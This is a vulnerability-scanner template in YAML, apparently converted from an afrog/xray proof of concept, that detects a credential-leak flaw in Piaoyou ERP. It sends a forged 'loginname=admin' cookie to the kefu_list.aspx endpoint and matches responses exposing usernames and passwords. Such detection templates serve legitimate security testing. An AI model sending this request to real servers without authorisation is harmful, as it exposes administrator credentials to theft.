# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - headers:
      Cookie: pyerpcookie=loginname=admin
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - username
          - password
          - 系统管理员
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/json_db/kefu_list.aspx?stype=0&_search=false&nd=1751246532981&rows=25&page=1&sidx=id&sord=asc'
id: piaoyou-erp-kefu-list-fileread
info:
  author: avic123
  description: 票友ERP系统存在信息泄露漏洞，未经授权的攻击者可通过该漏洞获取管理员账号密码信息。
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: 票友ERP系统kefu_list存在信息泄露
  severity: high
  tags: piaoyou,erp,fileread,argus-import
